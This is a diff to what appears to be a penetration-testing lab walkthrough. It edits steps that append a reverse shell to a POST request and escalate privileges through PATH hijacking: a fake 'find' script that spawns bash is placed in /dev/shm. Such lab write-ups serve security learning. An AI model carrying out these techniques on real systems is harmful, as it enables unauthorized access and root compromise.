@@ -141,7 +141,7 @@ Append reverse shell to POST request and send to the server:
 
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 * Be sure to upgrade your dummy shell to a fully-interactive one
 
@@ -236,15 +236,16 @@ Navigate to globally writeable directory:
 cd /dev/shm
 ```
 
-Create malicious file:
+Create malicious file using the find binary:
 
-malicious:
+find:
 
-```
-#!/bin/bash
-
+<pre><code><strong>nano find
+</strong><strong>
+</strong><strong>#!/bin/bash
+</strong>
 bash
-```
+</code></pre>
 
 Export Path Variable:
 
